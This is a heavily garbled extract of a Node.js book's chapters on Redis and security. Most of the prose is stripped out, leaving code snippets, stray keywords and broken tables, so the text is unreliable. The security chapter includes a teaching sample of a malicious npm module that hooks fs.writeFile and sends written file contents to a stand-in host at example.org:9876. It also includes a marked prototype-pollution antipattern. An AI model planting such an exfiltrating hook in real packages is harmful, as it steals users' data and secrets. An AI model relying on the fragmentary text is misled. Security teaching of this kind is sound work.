+    wx     
+fs.writeFileSync('/tmp/lock.txt','',{flag:'wx'});
+
+    lock.txt     fs.unlinkSync()    fs.writeFileSync()    while     spinlock    deadlock    
+Introduction to Redis
+
+    
+$docker run-it--rm\
+--name distnode-redis\
+-p 6379:6379\
+
+redis:6.0.5-alpine
+
+    6379    
+$echo"PING\r\nQUIT\r\n"|nc localhost 6379
+>+PONG
+>+OK
+
+    PING     QUIT    QUIT
+    redis-cli     
+$docker exec-it\distnode-redis\redis-cli
+
+    INFO server     
+Redis Operations
+    sharding        user:123    user:123:friends    redis    ioredis     $mkdir redis&&cd redis
+$npm init-y
+$npm installioredis@4.17
+
+    basic.js    
+example    9-2.redis/basic.js
+#!/usr/bin/env node
+//npm installioredis@4.17
+
+const Redis=require('ioredis');
+const redis=new Redis('localhost:6379');
+
+(async()=>{
+await redis.set('foo','bar');
+const result=await redis.get('foo');console.log('result:',result);redis.quit();
+})();
+
+    ioredis     redis     redis.get()    GET     redis.set('foo','bar')    SET foo bar
+    $node redis/basic.js
+>result:bar
+
+    
+
+
+    redis/basic.js     
+    
+Strings
+    
+SET foo"bar"
+
+    SET     redis-cli     SET     
+SET key value[EX seconds|PX milliseconds][NX|XX][KEEPTTL]
+
+    EX 1    PX 1000    NX     XX     KEEPTTL     
+GET foo
+>"bar"
+
+    bar     
+    
+SET visits"100"
+>OK
+INCR visits
+>(integer)101
+
+    visits     100    101    INCR     INCRBY     GET visits     visits     INCR     visits     visits     APPEND     INCRBYFLOAT     
+Lists
+    
+    list     
+RPUSH list aaa
+>(integer)1 RPUSH list bbb
+>(integer)2
+LRANGE list 0-1
+>1)"aaa"
+>2)"bbb"
+
+    RPUSH     list     RPUSH     LRANGE     LRANGE     LRANGE key 0-1     
+Table 9-1.Redis list commands and equivalent JavaScript array operations
+
+Operation	Redis command	JavaScript array equivalent
+Add entry to right	
+RPUSH key element	
+arr.push(element)
+Add entry to left	
+LPUSH key element	
+arr.unshift(element)
+Take entry from right	
+RPOP key element	
+arr.pop(element)
+Take entry from left	
+LPOP key element	
+arr.shift(element)
+Get length	
+LLEN key	
+arr.length
+Retrieve element at index	
+LINDEX key index	
+x=arr[index]
+
+
+
+Replace element at index	LSET key index element	arr[index]=x
+Move element	
+RPOPLPUSH source dest	
+dest.push(source.pop())
+Get element range	
+LRANGE key start stop	
+arr.slice(start,stop+1)
+Get first occurence	
+LPOS key element	
+arr.indexOf(element)
+Get last occurence	
+RPOS key element	
+arr.lastIndexOf(element)
+Reduce size	
+LTRIM key start stop	
+arr=arr.slice(start,stop+1)
+
+    RPOPLPUSH     RPOPLPUSH     RPOP     LPUSH     
+
+
+Sets
+    new Set()    
+SADD set alpha
+
+>(integer)1 SADD set beta
+>(integer)1 SADD set beta
+>(integer)0 SMEMBERS set
+>1)"beta"	2)"alpha"
+
+    SADD     alpha     set    beta     SADD     beta     SMEMBERS     Set    Table 9-2.Redis set commands and equivalent JavaScript set
+operations
+
+Operation	Redis command	JavaScript set equivalent
+Add entry to set	
+SADD key entry	
+set.add(entry)
+Count entries	
+SCARD key	
+set.size
+See if set has entry	
+SISMEMBER key entry	
+set.has(entry)
+Remove entry from set	
+SREM key entry	
+set.delete(entry)
+Retrieve all entries	
+SMEMBERS key	
+Array.from(set)
+Move between sets	
+SMOVE src dest entry	
+s2.delete(entry)&&s1.add(entry)
+
+    SRANDMEMBER     SPOP     SSCAN     
+    
+Hash
+    new Map()    some     
+HSET obj a 1
+>(integer)1 HSET obj b 2
+>(integer)1 HSET obj b 3
+>(integer)0 HGETALL obj
+1)"a"	2)"1"	3)"b"	4)"3"
+
+    HSET obj b     b     HGETALL     ioredis    {a:1,b:2}    Map    
+Table 9-3.Redis hash commands and equivalent JavaScript map operations
+
+Operation	Redis command	JavaScript map equivalent
+Set an entry	
+HSET key field value	
+map.set(field,value)
+Remove an entry	
+HDEL key field	
+map.delete(field)
+Has an entry	
+HEXISTS key field	
+map.has(field)
+Retrieve an entry	
+HGET key field	
+map.get(field)
+Get all entries	
+HGETALL key	
+Array.from(map)
+List keys	
+HKEYS key	
+Array.from(map.keys())
+List values	
+HVALS key	
+Array.from(map.values())
+
+    Map     Number     v    map.get(field).v++    HINCRBY key field 1    
+{"wage":100000,"...other fields":"..."}
+
+    wage     GET key     result=JSON.parse(response)    result.wage+=
+
+1000     payload=JSON.stringify(result)    SET key payload     
+Sorted Sets
+    
+ZADD scores 1000 tlhunter ZADD scores 500 zerker ZADD scores 100 rupert ZINCRBY scores 10 tlhunter
+>"1010"
+ZRANGE scores 0-1 WITHSCORES
+>	1)	"rupert"	2)	"100"
+>	3)	"zerker"	4)	"900"
+>	5)	"tlhunter"	6)	"1010"
+
+    ZADD     ZADD     ZINCRBY     ZRANGE     ZRANGE key 0-1     WITHSCORES     
+Table 9-4.Redis sorted set commands
+
+Operation	Redis command
+
+
+    ZREVRANK scores tlhunter    REV     REM     
+Generic Commands
+    HDEL     
+Table 9-5.Generic Redis commands
+
+Operation	Redis command
+
+
+    KEYS     
+Table 9-6.Redis server commands
+
+Operation	Redis Command
+
+
+Get info about server	INFO
+
+
+    MONITOR     
+Other Types
+    
+    
+Seeking Atomicity
+    hello world     single     RPOPLPUSH     multiple     RPOP
+    LPUSH    
+Table 9-7.Redis compound commands
+    
+Command	Alternative pseudocode
+
+
+    GET    SET     
+Figure 9-2.Sequential Redis commands like GET and SET aren�t atomic
+
+    counter     INCR     
+Figure 9-3.INCR is atomic in Redis
+
+    INCR     employees     employee-42    
+
+
+
+
+    INCR     SETNX     
+Transactions
+    MULTI     EXEC    ioredis
+    redis/transaction.js     
+example    9-3.redis/transaction.js
+#!/usr/bin/env node
+//npm installioredis@4.17
+const Redis=require('ioredis');
+const redis=new Redis('localhost:6379');
+
+(async()=>{
+const[res_srem,res_hdel]=await redis.multi()
+.srem("employees","42")//Remove from Set
+.hdel("employee-42","company-id")//Delete from Hash
+.exec();
+console.log('srem?',!!res_srem[1],'hdel?',!!res_hdel[1]);redis.quit();
+})();
+
+ioredis     .multi()    .exec()    
+    
+$docker exec distnode-redis redis-cli SADD employees 42 tlhunter
+$docker exec distnode-redis redis-cli HSET employee-42 company-id funcorp
+$node redis/transaction.js
+>srem?true hdel?true
+
+    ioredis     srem?false hdel?false    MULTI     EXEC     EXEC
+    MULTI     EXEC    RPOPLPUSH     RPOP     LPUSH     
+
+Figure 9-4.Redis transactions wait for EXEC before committing changes
+    resigned     salary     
+Lua Scripting
+        Map    
+for     while     if     EVAL     SCRIPT LOAD         EVALSHA     EVAL     EVALSHA     
+EVAL script numkeys key[key...]arg[arg...]EVALSHA sha1 numkeys key[key...]arg[arg...]
+
+    
+
+
+    numkeys     numkeys
+    
+Writing a Lua Script File
+    redis/add-user.lua     
+example    9-4.redis/add-user.lua
+local LOBBY=KEYS[1]--Set local GAME=KEYS[2]--Hash local USER_ID=ARGV[1]--String
+
+redis.call('SADD',LOBBY,USER_ID)
+
+if redis.call('SCARD',LOBBY)==4 then
+local members=table.concat(redis.call('SMEMBERS',LOBBY),",")redis.call('DEL',LOBBY)--empty lobby
+local game_id=redis.sha1hex(members)redis.call('HSET',GAME,game_id,members)return{game_id,members}
+end
+
+return nil
+    KEYS    ARGV    
+    LOBBY    local     GAME    USER_ID    LOBBY     redis.call()    SADD    if     SCARD    if     nil     nil     null     ioredis     if     SMEMBERS    table.concat()    DEL
+    redis.sha1hex()        HSET    
+    lobby{pvp}    game{pvp}    
+Loading the Lua Script
+    redis/script.js     
+example    9-5.redis/script.js
+#!/usr/bin/env node
+//npm installioredis@4.17
+const redis=new(require('ioredis'))('localhost:6379');redis.defineCommand("adduser",{
+numberOfKeys:2,
+lua:require('fs').readFileSync(dirname+'/add-user.lua')
+});
+const LOBBY='lobby',GAME='game';(async()=>{
+console.log(await redis.adduser(LOBBY,GAME,'alice'));//null console.log(await redis.adduser(LOBBY,GAME,'bob'));//null console.log(await redis.adduser(LOBBY,GAME,'cindy'));//null const[gid,players]=await redis.adduser(LOBBY,GAME,'tlhunter');console.log('GAME ID',gid,'PLAYERS',players.split(','));redis.quit();
+})();
+
+    ioredis     add-user.lua     
+redis.defineCommand()    adduser    lobby     game    redis.adduser()    redis.defineCommand()    redis.adduser()
+    redis     doesn�t     ADDUSER     redis.adduser()    add-user.lua     null     gid    players    
+Tying It All Together
+    MONITOR     
+$docker exec-it distnode-redis redis-cli monitor
+$node redis/script.js
+
+    redis.adduser()    
+null null null
+GAME ID 523c26dfea8b66ef93468e5d715e11e73edf8620 PLAYERS['tlhunter','cindy','bob','alice']
+
+    MONITOR     lua     
+APP:"info"
+APP:"evalsha""1c..32""2""lobby""game""alice"
+APP:"eval""local...\n""2""lobby""game""alice"LUA:"SADD""lobby""alice"
+LUA:"SCARD""lobby"
+...PREVIOUS 3 LINES REPEATED TWICE FOR BOB AND CINDY...
+APP:"evalsha""1c..32""2""lobby""game""tlhunter"LUA:"SADD""lobby""tlhunter"
+LUA:"SCARD""lobby"LUA:"SMEMBERS""lobby"
+LUA:"DEL""lobby"
+LUA:"HSET""game""52..20""tlhunter,cindy,bob,alice"
+
+    INFO     ioredis     ioredis     alice     EVALSHA     1c..32    ioredis     EVAL     local�    SADD     SCARD     EVALSHA    SADD    SCARD     bob     cindy    
+    tlhunter    SADD    SCARD    SMEMBERS    DEL    HSET     MONITOR     
+
+1	For 
+example   ,an�has both a single-byte and multibyte UTF representations,which are considered unequal when doing a binary comparison.
+2	Check out theLuvit.ioproject if you�d like to see what a Node.js-like platform implemented in Lua looks like.
+3Redis generates a SHA1 hash of the script and uses that to refer to scripts in an internal cache.
+4And assuming the players haven�t discovered a SHA1 collision.
+
+Chapter 10.Security
+
+
+    
+Wrangling Repositories
+    
+    package-lock.json     
+https://github.com/<org>?language=javascript
+
+    
+    @corp/acct    
+Table 10-1.
+example    Node.js service spreadsheet
+
+Service	Team	Node.js version	Deployment	Server	Account package
+gallery	Selfie	v10.3.1	Beanstalk	express@v3.1.1	@corp/acct@v1.2.3
+profile	Profile	v12.1.3	Kubernetes	@hapi/hapi@14.3.1	@corp/acct@v2.1.1
+resizer	Selfie	v12.13.1	Lambda	N/A	N/A
+friend-finder	Friends	v10.2.3	Kubernetes	fastify@2.15.0	@corp/acct@v2.1.1
+
+    Service     Team     Node.js version     
+    process.version     Deployment     Server     Account package     @corp/acct     Long-Term Support(LTS)    Node.js version     
+
+
+
+Recognizing Attack Surface
+    
+    
+Parameter Checking and Deserialization
+    POST     JSON.parse()    User     name:string     age:integer    
+    name     age    
+const temp=JSON.parse(req.body);
+const user=new User({name:temp.name,age:temp.age});
+
+    JSON.parse()    denial of service     bodyLimit     body-parser     limit     Prototype Pollution    proto    obj.    proto    =foo     Object.setPrototypeOf(obj,foo)    
+example    10-1.prototype-pollution.js
+    //WARNING:ANTIPATTERN!
+function shallowClone(obj){const clone={};
+for(let key of Object.keys(obj)){clone[key]=obj[key];
+}
+return clone;
+}
+const request='{"user":"tlhunter","proto":{"isAdmin":true}}';const obj=JSON.parse(request);
+
+if('isAdmin'in obj)throw new Error('cannot specify isAdmin');const user=shallowClone(obj);
+console.log(user.isAdmin);//true
+
+    proto    isAdmin     obj    proto    JSON.parse()    obj.isAdmin     shallowClone()    clone['    proto    ']    user     {"isAdmin":true}    
+    
+Malicious npm Packages
+        typo squatting    
+    package-lock.json     
+example    10-2.malicious-module.js
+const fs=require('fs');const net=require('net');
+const CONN={host:'
+example   .org',port:9876};const client=net.createConnection(CONN,()=>{});const_writeFile=fs.writeFile.bind(fs);fs.writeFile=function(){
+client.write(`${String(arguments[0])}:::${String(arguments[1])}`);return_writeFile(...arguments);
+};
+    fs.writeFile     
+example   .org:9876    pg     password    
+Application Configuration
+
+    
+Environment Variables
+    
+$echo"console.log('conn:',process.env.REDIS)">app-env-var.js
+$REDIS="redis://admin:hunter2@192.168.2.1"node app-env-var.js
+
+    app-env-var.js     
+    
+    undefined    
+if(!process.env.REDIS){
+console.error('Usage:REDIS=<redis_conn>node script.js');process.exit(1);
+}
+
+    .gitignore     dev.env     
+example    10-3.dev.env
+exportREDIS=redis://admin:hunter2@192.168.2.1
+    dev.env     
+$node-e"console.log(process.env.REDIS)"
+>undefined
+$source dev.env
+$node-e"console.log(process.env.REDIS)"
+>redis://admin:hunter2@192.168.2.1
+
+    node     
+
+
+    
+Configuration Files
+    config/staging.js     config/production.js    
+    config     nconf     NODE_ENV     REDIS
+    configuration    
+$mkdir configuration&&cd configuration
+$npm init-y
+$mkdir config
+$touch config/{index,default,development,staging,production}.js
+
+    config/index.js     config/default.js     config/default.js         
+example    10-4.configuration/config/default.js
+module.exports={
+REDIS:process.env.REDIS,WIDGETS_PER_BATCH:2,
+MAX_WIDGET_PAYLOAD:Number(process.env.PAYLOAD)||1024*1024
+};
+
+    REDIS     REDIS     WIDGETS_PER_BATCH
+
+    MAX_WIDGET_PAYLOAD     PAYLOAD     config/development.js         
+example    10-5.configuration/config/development.js
+module.exports={ENV:'development',
+REDIS:process.env.REDIS||'redis://localhost:6379',MAX_WIDGET_PAYLOAD:Infinity
+};
+
+    ENV     CONFIG.ENV     process.env.NODE_ENV    REDIS     REDIS     MAX_WIDGET_PAYLOAD    Infinity    
+
+
+    config/production.js     config/staging.js     ENV     
+WIDGETS_PER_BATCH    config/index.js         
+example    10-6.configuration/config/index.js
+const{join}=require('path');const ENV=process.env.NODE_ENV;
+
+try{
+var env_config=require(join(dirname,`${ENV}.js`));
+}catch(e){
+console.error(`Invalid environment:"${ENV}"!`);console.error(`Usage:NODE_ENV=<ENV>node app.js`);process.exit(1);
+}
+const def_config=require(join(dirname,'default.js'));
+
+module.exports=Object.assign({},def_config,env_config);
+    
+    config/default.js     
+const Redis=require('ioredis');
+const CONFIG=require('./config/index.js');
+
+const redis=new Redis(CONFIG.REDIS);
+
+    config/index.js    
+Secrets Management
+Secrets management     
+apiVersion:v1 kind:Secret metadata:
+  name:redisprod type:Opaque stringData:
+redisconn:"redis://admin:hunter2@192.168.2.1"
+
+    
+    redisprod:redisconn    spec.template.spec.containers     
+env:
+-name:REDIS valueFrom:
+secretKeyRef:name:redisprod key:redisconn
+
+    REDIS     redisprod:redisconn     
+
+
+Upgrading Dependencies
+    
+    
+
+
+
+
+        
+Automatic Upgrades with GitHub Dependabot
+    Dependency graph    Dependabot alerts    Dependabot security updates    
+Figure 10-1.The dreaded GitHub dependency vulnerability
+
+        ependabot pull request
+
+    @dependabot rebase     
+
+
+
+Manual Upgrades with npm CLI
+    audit    
+$mkdir audit&&cd audit
+$npm init-y
+$npm installjs-yaml@3.9.1hoek@4.2.0
+
+    npm install     
+added 5 packages from 8 contributors and audited 5 packages in 0.206s found 3 vulnerabilities(2 moderate,1 high)
+run`npm audit fix`to fix them,or`npm audit`for details
+
+    
+$npm outdated
+
+    
+Table 10-2.
+example    npm outdated output
+
+Package Current Wanted Latest Location
+
+hoek	4.2.0	4.2.1	6.1.3	audit
+
+
+
+
+    current     wanted     package.json     latest     location     npm audit         node_modules     
+$rm-rf node_modules
+$npm install
+
+    
+$npm audit
+
+    
+Table 10-3.
+example    npm audit output
+
+
+
+
+Level	Type	Package
+
+Dependency
+of	Path	More info
+
+
+
+
+Moderate Denial of	js-yaml	js-yaml	js-	https://npmjs.com/advisories/788
+
+Service	yaml
+
+
+
+Moderate Prototype
+Pollution
+
+hoek	hoek	hoek	https://npmjs.com/advisories/566
+
+
+
+
+    js-yaml     hoek     type     Denial of Service     Code Injection     Prototype Pollution    package     dependency of     path     patched in     js-yaml    hoek     
+$npm update js-yaml--depth 1
+
+    package.json     js-yaml@^3.9.1     package.json     package-lock.json     js-yaml@^3.14.0    npm audit     
+    hoek     npm audit     patched in     
+$npm update hoek
+
+    hoek@^4.2.0     hoek@^4.2.1    npm audit     npm audit     
+$npm audit--audit-level=high--only=prod;echo$?
+
+    
+Unpatched Vulnerabilities
+    
+    git diff--patch    foo.run(user_input)    package.json     
+    a[0][999999999]=1    POST     
+Upgrading Node.js
+    http     
+    node_modules     
+Node.js LTS Schedule
+    LTS    
+
+Figure 10-3.Node.js LTS release schedule5
+    end of life    
+Upgrade Approach
+    
+    
+    .node-version     
